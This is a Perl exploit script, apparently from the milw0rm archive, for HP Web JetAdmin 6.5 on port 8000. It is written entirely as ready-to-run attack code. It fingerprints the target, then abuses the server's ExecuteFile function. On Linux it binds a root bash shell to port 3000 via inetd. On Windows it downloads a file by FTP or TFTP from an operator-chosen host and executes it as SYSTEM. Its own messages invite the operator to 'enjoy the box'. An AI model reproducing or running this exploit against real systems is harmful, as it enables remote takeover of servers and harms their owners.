#!/usr/bin/perl 
use IO::Socket;
#
# This is an exploit for HP Web JetAdmin, the printer management server from HP. 
# It is NOT about printers! The service usually runs on port 8000 on Windows, 
# Solaris or Linux boxes.
#
# Greetz: The Phenoelit People, c-base crew, EEyE (rock!), Halvar on the other
#         side of the planet, Johnny, Andreas, Lisa, H D Moore, Nicolas
#         Fishbach and all the others I forgot
#


$|=1;

die "Specify server name or IP\n" unless ($host=shift);

#
# lala stuff 
# 
print "Phenoelit HP Web JetAdmin 6.5 remote\n".
" Linux root and Windows NT/2000 Administrator exploit\n".
" by FX of Phenoelit\n".
" Research done at BlackHat Singapore 2002\n\n";

#
# Check version for the kiddies
# 
$request="GET /plugins/hpjwja/help/about.hts HTTP/1.0\r\n\r\n";
&doit();
#
# Get the path first
#
$rs=~/--\ framework\.ini\ (.+)-->/;
$hppath=$1;
if ($hppath) { $hppath=~s/\/doc\/plugins\/framework\/framework.ini//; }
# 
# Now get some more info
#
$rs=~s/[\r\n\t]//g;
$rs=~s/<\/td><td\ valign\=\"top\"\ nowrap>//g;
$rs=~/JetAdmin\ Version<\/b>([^<]+)<\/td>/;
$version=$1;
$rs=~/System\ Version<\/b>([^<]+)<\/td>/;
$system=$1;
die "It's not version 6.5 or version extraction failed\n" unless ($version=~/6\.5/);
die "Could not extract path\n" unless ($hppath);
#
# Info 2 user
#
print "HP Web JetAdmin Path: \n\t".$hppath."\n";
print "HP Web JetAdmin Version: ".$version."\n";

if ($system=~/Linux/) {
printf "Host system identified as Linux ...\n";
#
# Create file content and kick off inetd
#
$cont= 
"obj=Httpd:VarCacheSet(hacked,true);".
    "Httpd:ExecuteFile(/usr/sbin/,inetd,".$hppath."/cache.ini)".
"&__BrowserID=0%0a3000%20stream%20tcp%20nowait%20root%20/bin/bash%20bash%0a";

$request = "POST /plugins/framework/script/content.hts HTTP/1.0\r\n".
"Host: ".$host."\r\n".
"Accept: text/html, text/plain, application/pdf, image/*, ".
"image/jpeg, text/sgml, video/mpeg, image/jpeg, ".
"image/tiff, image/x-rgb, image/png, image/x-xbitmap,".
" image/x-xbm, image/gif, application/postscript, */*;q=0.01\r\n".
"Accept-Language: en\r\n".
"Pragma: no-cache\r\n".
"Cache-Control: no-cache\r\n".
"User-Agent: Phenoelit script\r\n".
"Referer: http://www.phenoelit.de/\r\n".
"Content-type: application/x-www-form-urlencoded\r\n".
"Content-length: ".length($cont)."\r\n\r\n".
$cont;

&doit();
print "You should now connect to $host:3000 and enjoy your root shell\n";

} elsif ($system=~/WinNT/) {

print "Target system is Windows.\n".
" Do you want file upload via FTP [f] or TFTP [t]: ";
$usersel=<STDIN>;
if ($usersel=~/^f/i) {
print "FTP used ...\n";
print "FTP Host: "; $ftph=<STDIN>; chomp($ftph);
print "FTP User: "; $ftpu=<STDIN>; chomp($ftpu);
print "FTP Pass: "; $ftpp=<STDIN>; chomp($ftpp);
print "FTP Path: "; $ftppath=<STDIN>; chomp($ftppath);
print "FTP File: "; $ftpfile=<STDIN>; chomp($ftpfile);

print "File ".$ftpfile." will be downloaded from ".$ftph.$ftppath."\n".
" with username ".$ftpu." and password ".$ftpp."\n";

$cont=
"obj=".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,open ".$ftph.",>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,".$ftpu.">>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,".$ftpp.">>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,lcd c:\\,>>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,cd ".$ftppath.",>>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,bin,>>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,get ".$ftpfile.",>>c:\\x.txt);".
"Httpd:ExecuteFile(,cmd.exe,/c,echo,quit,>>c:\\x.txt);".
"Httpd:ExecuteFile(,ftp.exe,-s:c:\\x.txt);".
"Httpd:ExecuteFile(c:\\,".$ftpfile.")";

} elsif ($usersel=~/^t/) {
print "TFTP used ...\n";
print "TFTP Host: "; $ftph=<STDIN>; chomp($ftph);
print "TFTP Path: "; $ftppath=<STDIN>; chomp($ftppath);
print "TFTP File: "; $ftpfile=<STDIN>; chomp($ftpfile);

$ftppath.="/" unless ($ftppath=~/\/$/);
$cont=
"obj=".
"Httpd:ExecuteFile(,tftp.exe,-i,".$ftph.",GET,".
$ftppath.$ftpfile.",c:\\".$ftpfile.");".
"Httpd:ExecuteFile(c:\\,".$ftpfile.")";

} else {
print "Wurstfinger ?\n";
exit 0;
}

$request = "POST /plugins/framework/script/content.hts HTTP/1.0\r\n".
"Host: ".$host."\r\n".
"Accept: text/html, text/plain, application/pdf, image/*, ".
"image/jpeg, text/sgml, video/mpeg, image/jpeg, ".
"image/tiff, image/x-rgb, image/png, image/x-xbitmap,".
" image/x-xbm, image/gif, application/postscript, */*;q=0.01\r\n".
"Accept-Language: en\r\n".
"Pragma: no-cache\r\n".
"Cache-Control: no-cache\r\n".
"User-Agent: Phenoelit script\r\n".
"Referer: http://www.phenoelit.de/\r\n".
"Content-type: application/x-www-form-urlencoded\r\n".
"Content-length: ".length($cont)."\r\n\r\n".
$cont;

print "If everything works well, the specified file should be running\n".
" soon in SYSTEM context. Don't stop this script until your program\n".
" terminates. Enjoy the box.\n";
&doit();

} else {
print "Host OS (".$system.") not supported by exploit - modify it\n";
}

exit 0;


sub doit {
    $remote =
      IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$host,PeerPort=>"8000",);
    die "cannot connect to http daemon on $host\n" unless($remote);
    $remote->autoflush(1);
    print $remote $request;

    $rs="";
    while ( $rline=<$remote> ) { 
$rs.=$rline;
#print $rline;
    }

    close $remote;
}

# milw0rm.com [2004-04-28]
